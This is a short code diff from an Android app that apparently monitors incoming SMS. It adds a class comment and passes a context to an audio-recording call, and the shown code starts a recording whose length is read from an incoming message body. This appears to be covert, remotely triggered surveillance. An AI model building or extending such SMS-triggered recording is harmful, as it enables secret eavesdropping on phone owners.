@@ -22,7 +22,12 @@ import com.inet.android.request.RequestMakerImpl;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 import com.inet.android.utils.WorkTimeDefiner;
-
+/**
+ * SmsSentObserver class is design for monitoring incoming sms
+ * 
+ * @author johny homicide
+ * 
+ */
 public class SMSBroadcastReceiver extends BroadcastReceiver {
 	private static final String TAG = "SMS";
 	private SmsSentObserver smsSentObserver = null;
@@ -102,7 +107,7 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 								msgs[k].getMessageBody().length()))*60;
 						Logging.doLog(LOG_TAG, "sec: " + minute, "sec: "
 								+ minute);
-						RecordAudio recordAudio = new RecordAudio(minute);
+						RecordAudio recordAudio = new RecordAudio(mContext, minute);
 						recordAudio.executeRecording();
 					}
 
